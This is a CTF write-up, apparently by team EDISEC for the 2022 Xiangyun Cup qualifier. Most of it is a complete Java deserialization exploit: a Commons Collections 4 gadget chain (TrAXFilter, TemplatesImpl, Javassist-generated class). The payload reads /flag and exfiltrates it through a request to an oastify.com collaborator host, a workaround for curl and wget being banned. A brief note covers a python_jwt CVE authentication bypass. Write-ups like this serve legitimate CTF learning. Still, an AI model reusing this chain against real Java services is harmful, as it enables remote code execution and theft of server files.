---
title: 第三届"祥云杯"CTF初赛WriteUp By EDISEC
contest: 第三届祥云杯初赛
year: 2022
difficulty: hard
vuln_type: web_unknown
tags: [祥云杯, ezjava CC4链, CommonsCollections4 TrAXFilter, TemplatesImpl, Javassist动态类, DNS外带flag, python_jwt CVE绕认证, OGNL注入, 内存马]
attack_chain: ezjava:CC4链(ChainedTransformer+TrAXFilter+TemplatesImpl+Javassist)→URL外带flag→FunWEB:python_jwt CVE绕认证→...→内存马+OGNL注入
key_payload: "CC4:ChainedTransformer(new ConstantTransformer(TrAXFilter.class)+InstantiateTransformer)+TransformingComparator+PriorityQueue;Javassist AbstractTranslet+makeClassInitializer;URL=http://flag.xgh92aja87fsginch3ss2fnklbr7fw.oastify.com/"
one_liner: 第三届祥云杯初赛Web：CC4链+Javassist动态类+DNS外带flag+python_jwt绕认证
lesson: CC链curl/wget被ban时用URL+HttpURLConnection发GET请求外带flag到oastify
quality: high
---

# 第三届"祥云杯"CTF初赛WriteUp By EDISEC

**赛事**：第三届祥云杯初赛（2022，EDISEC战队）

**Web-1 ezjava**：
- CC4链 反弹shell（curl wget被ban）
- 读flag并发送出去

**CC4链**（CommonsCollections4 + TrAXFilter）：
```java
package com.ctf.ezjava;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class cc4 {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        
        // 读flag并URL外带
        String cmd = "String flag = \"\";\n" +
            "String str;\n" +
            "java.io.BufferedReader in = new java.io.BufferedReader(new java.io.FileReader(\"/flag\"));\n" +
            "while ((str = in.readLine()) != null) { flag += str; }\n" +
            "flag = flag.replace(\"{\",\"\");\n" +
            "flag = flag.replace(\"}\",\"\");\n" +
            "java.net.URL url = new java.net.URL(\"http://\"+flag+\".xgh92aja87fsginch3ss2fnklbr7fw.oastify.com/\");\n" +
            "java.net.HttpURLConnection con = (java.net.HttpURLConnection) url.openConnection();\n" +
            "con.setRequestMethod(\"GET\");\n" +
            "con.setRequestProperty(\"User-Agent\", \"feng\");\n" +
            "int responseCode = con.getResponseCode();\n";
        
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", targetByteCodes);
        setFieldValue(templates, "_name", "name");
        setFieldValue(templates, "_class", null);
        
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
            new ConstantTransformer(TrAXFilter.class),
            new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        });
        
        TransformingComparator comparator = new TransformingComparator(chain);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        Field size = Class.forName("java.util.PriorityQueue").getDeclaredField("size");
        size.setAccessible(true);
        size.set(queue, 2);
        Field comparator_field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        comparator_field.setAccessible(true);
        comparator_field.set(queue, comparator);
        
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc4"));
        outputStream.writeObject(queue);
        outputStream.close();
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc4"));
        inputStream.readObject();
    }
}
```

**DNS请求获得flag**：
- URL外带到 oastify.com
- 配合Collaborator或类似服务监听

**Web-2 FunWEB**：
- python_jwt CVE绕认证

**质量评估**：高（CC4链完整 + URL外带DNS技巧）
